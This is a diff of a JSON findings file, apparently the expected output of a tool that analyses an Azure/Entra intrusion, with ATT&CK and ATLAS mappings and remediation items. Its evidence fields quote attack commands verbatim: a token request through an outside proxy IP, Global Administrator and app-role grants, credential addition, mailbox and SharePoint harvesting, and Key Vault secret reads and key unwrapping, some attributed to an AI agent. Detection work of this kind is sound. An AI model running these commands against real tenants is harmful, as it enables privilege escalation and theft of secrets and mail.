@@ -9,7 +9,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "scripts",
@@ -21,7 +22,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "outputs",
@@ -33,7 +35,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "indicators",
@@ -45,7 +48,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "indicators Domain",
@@ -57,7 +61,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "indicators Email",
@@ -69,7 +74,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "indicators EntraLoginEndpoint",
@@ -81,7 +87,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "indicators GUID",
@@ -93,7 +100,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "indicators GraphEndpoint",
@@ -105,7 +113,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "indicators IPv4",
@@ -117,7 +126,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "indicators KeyVaultEndpoint",
@@ -129,7 +139,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "indicators OAuthScope",
@@ -141,7 +152,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "indicators URL",
@@ -153,7 +165,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities",
@@ -165,7 +178,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities AppCredentialAddition",
@@ -177,7 +191,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities AppRoleAssignment",
@@ -189,7 +204,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities AzureResourceEnumeration",
@@ -201,7 +217,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities GlobalAdministratorAssignment",
@@ -213,7 +230,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities GraphDirectoryEnumeration",
@@ -225,7 +243,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities KeyVaultKeyEnumeration",
@@ -237,7 +256,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities KeyVaultKeyUnwrap",
@@ -249,7 +269,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities KeyVaultSecretRead",
@@ -261,7 +282,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities MailboxAccess",
@@ -273,7 +295,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities SharePointEnumeration",
@@ -285,7 +308,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities TeamsMessageAccess",
@@ -297,7 +321,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "activities TokenRequest",
@@ -309,7 +334,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "tactics",
@@ -321,31 +347,21 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "targeted",
     "section": "summary",
-    "value": 8,
+    "value": 5,
     "detail": null,
     "basis": null,
     "files": null,
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
-  },
-  {
-    "item": "targeted username",
-    "section": "summary",
-    "value": 1,
-    "detail": null,
-    "basis": null,
-    "files": null,
-    "attack": null,
-    "atlas": null,
-    "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "targeted email",
@@ -357,19 +373,21 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "targeted device",
     "section": "summary",
-    "value": 4,
+    "value": 2,
     "detail": null,
     "basis": null,
     "files": null,
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "targeted ip",
@@ -381,31 +399,21 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "exposed",
     "section": "summary",
-    "value": 10,
+    "value": 7,
     "detail": null,
     "basis": null,
     "files": null,
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
-  },
-  {
-    "item": "exposed username",
-    "section": "summary",
-    "value": 3,
-    "detail": null,
-    "basis": null,
-    "files": null,
-    "attack": null,
-    "atlas": null,
-    "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "exposed email",
@@ -417,7 +425,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "exposed tenant",
@@ -429,7 +438,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "exposed application",
@@ -441,7 +451,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "exposed resource",
@@ -453,7 +464,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "exposed ip",
@@ -465,67 +477,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
-  },
-  {
-    "item": "20261015_090000_step01_token.sh",
-    "section": "script",
-    "value": "high",
-    "detail": "TokenRequest",
-    "basis": null,
-    "files": "token_20261015_090010.json",
-    "attack": "T1078.004",
-    "atlas": "AML.T0012",
-    "targets": null,
-    "evidence": null
-  },
-  {
-    "item": "20261015_091000_step03_escalate.ps1",
-    "section": "script",
-    "value": "high",
-    "detail": "GlobalAdministratorAssignment, AppRoleAssignment, AppCredentialAddition",
-    "basis": null,
-    "files": null,
-    "attack": "T1098.003, T1098.001",
-    "atlas": null,
-    "targets": null,
-    "evidence": null
-  },
-  {
-    "item": "20261015_093000_step05_vault.sh",
-    "section": "script",
-    "value": "high",
-    "detail": "KeyVaultSecretRead, KeyVaultKeyUnwrap",
-    "basis": null,
-    "files": "vaults_20261015_093010.txt, secrets_20261015_093030.txt",
-    "attack": "T1555.006, T1580",
-    "atlas": "AML.T0075",
-    "targets": null,
-    "evidence": null
-  },
-  {
-    "item": "agent_20261015_093500.jsonl",
-    "section": "output",
-    "value": "high",
-    "detail": "AppRoleAssignment, KeyVaultSecretRead",
-    "basis": null,
-    "files": null,
-    "attack": "T1098.003, T1555.006, T1580",
-    "atlas": "AML.T0075",
-    "targets": null,
-    "evidence": null
-  },
-  {
-    "item": "66666666-7777-4888-9999-000000000000",
-    "section": "targeted",
-    "value": "medium",
-    "detail": "username: prior",
-    "basis": null,
-    "files": "20261015_090000_step01_token.sh:8",
-    "attack": null,
-    "atlas": null,
-    "targets": null,
-    "evidence": "az login --service-principal -u \"$APP\" -p \"$SECRET\" --tenant \"$TENANT\" (20261015_090000_step01_token.sh:8)"
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "alice@corp.example",
@@ -537,7 +490,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": "for user in [\"alice@corp.example\", \"bob@corp.example\"]: (20261015_092000_step04_collect.py:7)"
+    "evidence": "for user in [\"alice@corp.example\", \"bob@corp.example\"]: (20261015_092000_step04_collect.py:7)",
+    "exposed": null
   },
   {
     "item": "bob@corp.example",
@@ -549,7 +503,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": "for user in [\"alice@corp.example\", \"bob@corp.example\"]: (20261015_092000_step04_collect.py:7)"
+    "evidence": "for user in [\"alice@corp.example\", \"bob@corp.example\"]: (20261015_092000_step04_collect.py:7)",
+    "exposed": null
   },
   {
     "item": "corpvault.vault.azure.net",
@@ -561,31 +516,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": "curl -s -H \"Authorization: Bearer $KV\" \"https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4\" >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:7)"
-  },
-  {
-    "item": "graph.microsoft.com",
-    "section": "targeted",
-    "value": "medium",
-    "detail": "device: prior",
-    "basis": null,
-    "files": "20261015_090000_step01_token.sh:5, 20261015_090500_step02_recon.ps1:2, 20261015_091000_step03_escalate.ps1:3, 20261015_092000_step04_collect.py:5",
-    "attack": null,
-    "atlas": null,
-    "targets": null,
-    "evidence": "curl -s -x http://144.172.64.128:8080 -d \"client_id=$APP\" -d \"scope=https://graph.microsoft.com/.default\" \\ (20261015_090000_step01_token.sh:5)\nInvoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/users?`$top=999\" | ConvertTo-Json | Out-File directory_20261015_090530.txt (20261015_090500_step02_recon.ps1:2)\nInvoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/applications/66666666-7777-4888-9999-000000000000/addPassword\" -Body '{}' (20261015_091000_step03_escalate.ps1:3)\nGRAPH = \"https://graph.microsoft.com/v1.0\" (20261015_092000_step04_collect.py:5)"
-  },
-  {
-    "item": "login.microsoftonline.com",
-    "section": "targeted",
-    "value": "medium",
-    "detail": "device: prior",
-    "basis": null,
-    "files": "20261015_090000_step01_token.sh:7",
-    "attack": null,
-    "atlas": null,
-    "targets": null,
-    "evidence": "\"https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token\" > token_20261015_090010.json (20261015_090000_step01_token.sh:7)"
+    "evidence": "curl -s -H \"Authorization: Bearer $KV\" \"https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4\" >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:7)",
+    "exposed": null
   },
   {
     "item": "corp.example",
@@ -597,7 +529,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": "for user in [\"alice@corp.example\", \"bob@corp.example\"]: (20261015_092000_step04_collect.py:7)"
+    "evidence": "for user in [\"alice@corp.example\", \"bob@corp.example\"]: (20261015_092000_step04_collect.py:7)",
+    "exposed": null
   },
   {
     "item": "144.172.64.128",
@@ -609,43 +542,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": "curl -s -x http://144.172.64.128:8080 -d \"client_id=$APP\" -d \"scope=https://graph.microsoft.com/.default\" \\ (20261015_090000_step01_token.sh:5)"
-  },
-  {
-    "item": "alice@corp.example",
-    "section": "exposure",
-    "value": "medium",
-    "detail": "username: collected",
-    "basis": null,
-    "files": "directory_20261015_090530.txt:1",
-    "attack": null,
-    "atlas": null,
-    "targets": null,
-    "evidence": null
-  },
-  {
-    "item": "bob@corp.example",
-    "section": "exposure",
-    "value": "medium",
-    "detail": "username: collected",
-    "basis": null,
-    "files": "directory_20261015_090530.txt:1",
-    "attack": null,
-    "atlas": null,
-    "targets": null,
-    "evidence": null
-  },
-  {
-    "item": "66666666-7777-4888-9999-000000000000",
-    "section": "exposure",
-    "value": "medium",
-    "detail": "username: used",
-    "basis": null,
-    "files": "20261015_090000_step01_token.sh:8",
-    "attack": null,
-    "atlas": null,
-    "targets": null,
-    "evidence": null
+    "evidence": "curl -s -x http://144.172.64.128:8080 -d \"client_id=$APP\" -d \"scope=https://graph.microsoft.com/.default\" \\ (20261015_090000_step01_token.sh:5)",
+    "exposed": null
   },
   {
     "item": "alice@corp.example",
@@ -657,7 +555,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "bob@corp.example",
@@ -669,7 +568,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "11111111-2222-4333-8444-555555555555",
@@ -681,7 +581,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "66666666-7777-4888-9999-000000000000",
@@ -693,7 +594,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "corp.sharepoint.com",
@@ -705,7 +607,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "144.172.64.60",
@@ -717,7 +620,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "144.172.64.128",
@@ -729,7 +633,8 @@
     "attack": null,
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "Privileged access obtained",
@@ -741,7 +646,8 @@
     "attack": "T1098.003",
     "atlas": null,
     "targets": "role roleTemplateId=62e90394-69f5-4237-9190-012177145e10; principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d ($sp); principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d",
-    "evidence": "GlobalAdministratorAssignment: Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/`$ref\" -Body $member (20261015_091000_step03_escalate.ps1:4)\nAppRoleAssignment: Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/servicePrincipals/$sp/appRoleAssignments\" -Body $grant (20261015_091000_step03_escalate.ps1:5)\nAppRoleAssignment: POST https://graph.microsoft.com/v1.0/servicePrincipals/9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d/appRoleAssignments (agent_20261015_093500.jsonl)"
+    "evidence": "GlobalAdministratorAssignment: Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/`$ref\" -Body $member (20261015_091000_step03_escalate.ps1:4)\nAppRoleAssignment: Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/servicePrincipals/$sp/appRoleAssignments\" -Body $grant (20261015_091000_step03_escalate.ps1:5)\nAppRoleAssignment: POST https://graph.microsoft.com/v1.0/servicePrincipals/9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d/appRoleAssignments (agent_20261015_093500.jsonl)",
+    "exposed": null
   },
   {
     "item": "Credentials exposed",
@@ -753,7 +659,8 @@
     "attack": "T1555.006",
     "atlas": null,
     "targets": "vault $v; vault corpvault; secret db-password; vault finvault; secret api-key; key kek",
-    "evidence": "KeyVaultSecretRead: az keyvault secret list --vault-name \"$v\" -o tsv >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:4)\nKeyVaultSecretRead: curl -s -H \"Authorization: Bearer $KV\" \"https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4\" >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:7)\nKeyVaultSecretRead: az keyvault secret show --vault-name finvault --name api-key (agent_20261015_093500.jsonl)\nKeyVaultKeyUnwrap: curl -s -X POST -H \"Authorization: Bearer $KV\" -d @wrapped.json \"https://corpvault.vault.azure.net/keys/kek/0a1b2c3d/unwrapkey?api-version=7.4\" (20261015_093000_step05_vault.sh:8)"
+    "evidence": "KeyVaultSecretRead: az keyvault secret list --vault-name \"$v\" -o tsv >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:4)\nKeyVaultSecretRead: curl -s -H \"Authorization: Bearer $KV\" \"https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4\" >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:7)\nKeyVaultSecretRead: az keyvault secret show --vault-name finvault --name api-key (agent_20261015_093500.jsonl)\nKeyVaultKeyUnwrap: curl -s -X POST -H \"Authorization: Bearer $KV\" -d @wrapped.json \"https://corpvault.vault.azure.net/keys/kek/0a1b2c3d/unwrapkey?api-version=7.4\" (20261015_093000_step05_vault.sh:8)",
+    "exposed": null
   },
   {
     "item": "Persistence established",
@@ -765,7 +672,8 @@
     "attack": "T1098.001",
     "atlas": null,
     "targets": "application 66666666-7777-4888-9999-000000000000",
-    "evidence": "AppCredentialAddition: Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/applications/66666666-7777-4888-9999-000000000000/addPassword\" -Body '{}' (20261015_091000_step03_escalate.ps1:3)"
+    "evidence": "AppCredentialAddition: Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/applications/66666666-7777-4888-9999-000000000000/addPassword\" -Body '{}' (20261015_091000_step03_escalate.ps1:3)",
+    "exposed": null
   },
   {
     "item": "Valid identity used",
@@ -777,7 +685,8 @@
     "attack": "T1078.004",
     "atlas": "AML.T0012",
     "targets": "tenant 11111111-2222-4333-8444-555555555555 ($TENANT); client 66666666-7777-4888-9999-000000000000 ($APP)",
-    "evidence": "TokenRequest: curl -s -x http://144.172.64.128:8080 -d \"client_id=$APP\" -d \"scope=https://graph.microsoft.com/.default\" -d \"grant_type=client_credentials\" -d \"client_secret=$SECRET\" \"https://login.microsoftonlin... (20261015_090000_step01_token.sh:5)\nTokenRequest: az login --service-principal -u \"$APP\" -p \"$SECRET\" --tenant \"$TENANT\" (20261015_090000_step01_token.sh:8)"
+    "evidence": "TokenRequest: curl -s -x http://144.172.64.128:8080 -d \"client_id=$APP\" -d \"scope=https://graph.microsoft.com/.default\" -d \"grant_type=client_credentials\" -d \"client_secret=$SECRET\" \"https://login.microsoftonlin... (20261015_090000_step01_token.sh:5)\nTokenRequest: az login --service-principal -u \"$APP\" -p \"$SECRET\" --tenant \"$TENANT\" (20261015_090000_step01_token.sh:8)",
+    "exposed": null
   },
   {
     "item": "Data collected",
@@ -789,7 +698,8 @@
     "attack": "T1114.002, T1213.005, T1213.002",
     "atlas": "AML.T0126, AML.T0036",
     "targets": "resource /sites; resource /sites/root/drives",
-    "evidence": "MailboxAccess: mail = requests.get(\"https://graph.microsoft.com/v1.0/users/\" + user + \"/messages?$top=500\", headers=headers) (20261015_092000_step04_collect.py:8)\nTeamsMessageAccess: chat = requests.get(\"https://graph.microsoft.com/v1.0/users/\" + user + \"/mailFolders/TeamsMessagesData/messages\", headers=headers) (20261015_092000_step04_collect.py:9)\nSharePointEnumeration: sites = requests.get(\"https://graph.microsoft.com/v1.0/sites?search=*\", headers=headers) (20261015_092000_step04_collect.py:10)\nSharePointEnumeration: drive = requests.get(\"https://graph.microsoft.com/v1.0/sites/root/drives\", headers=headers) (20261015_092000_step04_collect.py:11)"
+    "evidence": "MailboxAccess: mail = requests.get(\"https://graph.microsoft.com/v1.0/users/\" + user + \"/messages?$top=500\", headers=headers) (20261015_092000_step04_collect.py:8)\nTeamsMessageAccess: chat = requests.get(\"https://graph.microsoft.com/v1.0/users/\" + user + \"/mailFolders/TeamsMessagesData/messages\", headers=headers) (20261015_092000_step04_collect.py:9)\nSharePointEnumeration: sites = requests.get(\"https://graph.microsoft.com/v1.0/sites?search=*\", headers=headers) (20261015_092000_step04_collect.py:10)\nSharePointEnumeration: drive = requests.get(\"https://graph.microsoft.com/v1.0/sites/root/drives\", headers=headers) (20261015_092000_step04_collect.py:11)",
+    "exposed": null
   },
   {
     "item": "Commands generated by an AI agent",
@@ -801,19 +711,21 @@
     "attack": null,
     "atlas": "AML.T0102",
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "Environment mapped",
     "section": "impact",
     "value": "low",
     "detail": "Identities, resources or configuration were listed. Later steps were probably aimed with the result.",
-    "basis": "GraphDirectoryEnumeration, AzureResourceEnumeration, KeyVaultKeyEnumeration, Discovery tools, exposed username, exposed email, exposed resource, exposed ip",
+    "basis": "GraphDirectoryEnumeration, AzureResourceEnumeration, KeyVaultKeyEnumeration, Discovery tools, exposed email, exposed resource, exposed ip",
     "files": "20261015_090000_step01_token.sh, 20261015_090500_step02_recon.ps1, 20261015_092000_step04_collect.py, 20261015_093000_step05_vault.sh, agent_20261015_093500.jsonl, collect_20261015_092040.txt, directory_20261015_090530.txt",
     "attack": "T1087.004, T1069.003, T1580",
     "atlas": "AML.T0075",
-    "targets": "resource /users; resource /servicePrincipals; resource /directoryRoles; command Get-MgApplication; command az keyvault list; vault $v; vault finvault; username alice@corp.example; username bob@corp.example; email alice@corp.example; email bob@corp.example; resource corp.sharepoint.com; ip 144.172.64.60",
-    "evidence": "GraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/users?`$top=999\" | ConvertTo-Json | Out-File directory_20261015_090530.txt (20261015_090500_step02_recon.ps1:2)\nGraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/servicePrincipals?`$top=999\" (20261015_090500_step02_recon.ps1:3)\nGraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/directoryRoles\" (20261015_090500_step02_recon.ps1:4)\nGraphDirectoryEnumeration: Get-MgApplication -All (20261015_090500_step02_recon.ps1:5)\nAzureResourceEnumeration: az keyvault list --query \"[].name\" -o tsv > vaults_20261015_093010.txt (20261015_093000_step05_vault.sh:2)\nKeyVaultKeyEnumeration: az keyvault key list --vault-name \"$v\" -o tsv (20261015_093000_step05_vault.sh:5)\nKeyVaultKeyEnumeration: GET https://finvault.vault.azure.net/keys?api-version=7.4 (agent_20261015_093500.jsonl)\naz: az login --service-principal -u \"$APP\" -p \"$SECRET\" --tenant \"$TENANT\" (20261015_090000_step01_token.sh:8)\naz: az keyvault secret show --vault-name finvault --name api-key (agent_20261015_093500.jsonl)"
+    "targets": "resource /users; resource /servicePrincipals; resource /directoryRoles; command Get-MgApplication; command az keyvault list; vault $v; vault finvault",
+    "evidence": "GraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/users?`$top=999\" | ConvertTo-Json | Out-File directory_20261015_090530.txt (20261015_090500_step02_recon.ps1:2)\nGraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/servicePrincipals?`$top=999\" (20261015_090500_step02_recon.ps1:3)\nGraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/directoryRoles\" (20261015_090500_step02_recon.ps1:4)\nGraphDirectoryEnumeration: Get-MgApplication -All (20261015_090500_step02_recon.ps1:5)\nAzureResourceEnumeration: az keyvault list --query \"[].name\" -o tsv > vaults_20261015_093010.txt (20261015_093000_step05_vault.sh:2)\nKeyVaultKeyEnumeration: az keyvault key list --vault-name \"$v\" -o tsv (20261015_093000_step05_vault.sh:5)\nKeyVaultKeyEnumeration: GET https://finvault.vault.azure.net/keys?api-version=7.4 (agent_20261015_093500.jsonl)\naz: az login --service-principal -u \"$APP\" -p \"$SECRET\" --tenant \"$TENANT\" (20261015_090000_step01_token.sh:8)\naz: az keyvault secret show --vault-name finvault --name api-key (agent_20261015_093500.jsonl)",
+    "exposed": "email: alice@corp.example\nemail: bob@corp.example"
   },
   {
     "item": "Revoke sessions and reset identities",
@@ -825,7 +737,8 @@
     "attack": null,
     "atlas": null,
     "targets": "tenant 11111111-2222-4333-8444-555555555555 ($TENANT); client 66666666-7777-4888-9999-000000000000 ($APP)",
-    "evidence": "TokenRequest: curl -s -x http://144.172.64.128:8080 -d \"client_id=$APP\" -d \"scope=https://graph.microsoft.com/.default\" -d \"grant_type=client_credentials\" -d \"client_secret=$SECRET\" \"https://login.microsoftonlin... (20261015_090000_step01_token.sh:5)\nTokenRequest: az login --service-principal -u \"$APP\" -p \"$SECRET\" --tenant \"$TENANT\" (20261015_090000_step01_token.sh:8)"
+    "evidence": "TokenRequest: curl -s -x http://144.172.64.128:8080 -d \"client_id=$APP\" -d \"scope=https://graph.microsoft.com/.default\" -d \"grant_type=client_credentials\" -d \"client_secret=$SECRET\" \"https://login.microsoftonlin... (20261015_090000_step01_token.sh:5)\nTokenRequest: az login --service-principal -u \"$APP\" -p \"$SECRET\" --tenant \"$TENANT\" (20261015_090000_step01_token.sh:8)",
+    "exposed": null
   },
   {
     "item": "Remove added credentials",
@@ -837,7 +750,8 @@
     "attack": null,
     "atlas": null,
     "targets": "application 66666666-7777-4888-9999-000000000000",
-    "evidence": "AppCredentialAddition: Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/applications/66666666-7777-4888-9999-000000000000/addPassword\" -Body '{}' (20261015_091000_step03_escalate.ps1:3)"
+    "evidence": "AppCredentialAddition: Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/applications/66666666-7777-4888-9999-000000000000/addPassword\" -Body '{}' (20261015_091000_step03_escalate.ps1:3)",
+    "exposed": null
   },
   {
     "item": "Remove role and permission grants",
@@ -849,7 +763,8 @@
     "attack": null,
     "atlas": null,
     "targets": "role roleTemplateId=62e90394-69f5-4237-9190-012177145e10; principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d ($sp); principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d",
-    "evidence": "GlobalAdministratorAssignment: Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/`$ref\" -Body $member (20261015_091000_step03_escalate.ps1:4)\nAppRoleAssignment: Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/servicePrincipals/$sp/appRoleAssignments\" -Body $grant (20261015_091000_step03_escalate.ps1:5)\nAppRoleAssignment: POST https://graph.microsoft.com/v1.0/servicePrincipals/9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d/appRoleAssignments (agent_20261015_093500.jsonl)"
+    "evidence": "GlobalAdministratorAssignment: Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members/`$ref\" -Body $member (20261015_091000_step03_escalate.ps1:4)\nAppRoleAssignment: Invoke-RestMethod -Method Post -Headers $h -Uri \"https://graph.microsoft.com/v1.0/servicePrincipals/$sp/appRoleAssignments\" -Body $grant (20261015_091000_step03_escalate.ps1:5)\nAppRoleAssignment: POST https://graph.microsoft.com/v1.0/servicePrincipals/9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d/appRoleAssignments (agent_20261015_093500.jsonl)",
+    "exposed": null
   },
   {
     "item": "Rotate what was read",
@@ -861,7 +776,8 @@
     "attack": null,
     "atlas": null,
     "targets": "vault $v; vault corpvault; secret db-password; vault finvault; secret api-key; key kek",
-    "evidence": "KeyVaultSecretRead: az keyvault secret list --vault-name \"$v\" -o tsv >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:4)\nKeyVaultSecretRead: curl -s -H \"Authorization: Bearer $KV\" \"https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4\" >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:7)\nKeyVaultSecretRead: az keyvault secret show --vault-name finvault --name api-key (agent_20261015_093500.jsonl)\nKeyVaultKeyUnwrap: curl -s -X POST -H \"Authorization: Bearer $KV\" -d @wrapped.json \"https://corpvault.vault.azure.net/keys/kek/0a1b2c3d/unwrapkey?api-version=7.4\" (20261015_093000_step05_vault.sh:8)"
